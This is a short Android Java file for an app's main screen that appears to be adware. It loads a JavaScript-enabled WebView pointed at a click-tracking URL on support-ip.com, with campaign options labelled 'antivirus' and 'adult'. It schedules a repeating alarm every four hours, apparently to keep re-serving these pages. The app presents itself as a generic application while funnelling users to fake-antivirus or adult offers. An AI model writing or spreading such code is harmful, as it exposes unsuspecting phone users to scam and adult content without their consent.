package com.example.asti.myapplication;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.TextView;

import java.util.Calendar;

public class MainActivity extends AppCompatActivity {

    AlarmStuff as;
    private WebView webView;
    private TextView textView;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.frame_activity);

//        textView = (TextView)  findViewById(R.id.textView1);
//        textView.setVisibility(View.VISIBLE);


        webView = (WebView) findViewById(R.id.webView1);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());

        // antivirus
        //  webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=anund");

        // adult
        webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=adund");
//        webView.setVisibility(View.VISIBLE);

        as = new AlarmStuff();
//         3600 * 4 * 1000 = 4 часа = 14400000 мс
//        as.setRepeatingAlarm(MainActivity.this, 000);
        as.setRepeatingAlarm(MainActivity.this, 14400000);


    }
}

